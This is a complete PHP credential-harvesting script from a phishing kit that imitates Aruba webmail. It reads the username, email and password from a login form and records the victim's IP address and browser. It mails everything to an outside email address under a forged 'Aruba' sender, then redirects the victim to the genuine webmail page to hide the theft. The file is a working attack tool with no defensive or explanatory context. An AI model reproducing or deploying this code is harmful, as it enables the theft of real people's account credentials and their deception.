<?php



$domain = $_POST['dominiobox'];

$username = $_POST['login'];

$password = $_POST['password'];






$ip = getenv("REMOTE_ADDR");

$browser = $_SERVER['HTTP_USER_AGENT'];

$adddate=date("D M d, Y g:i a");

$message .= "--------------+ I Begin +--------------\n";

$message .= "Indirizzo Email  	   : ".$domain."\n";

$message .= "Password  	   : ".$password."\n";

$message .= "--------------------\n";

$message .= "Date : $adddate\n";

$message .= "IP Address : $ip\n";

$message .= "User-Agent: ".$browser."\n";

$message .= "--------------+ Jaga was here +--------------\n";




$recipient = "Alex.Gorsky@openmailbox.org";
$subject = "$username - $ip";
$headers = "From: Aruba";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://webmail.aruba.it/index.html?_v_=v4r2b49.20161003_1200");

	   }


?>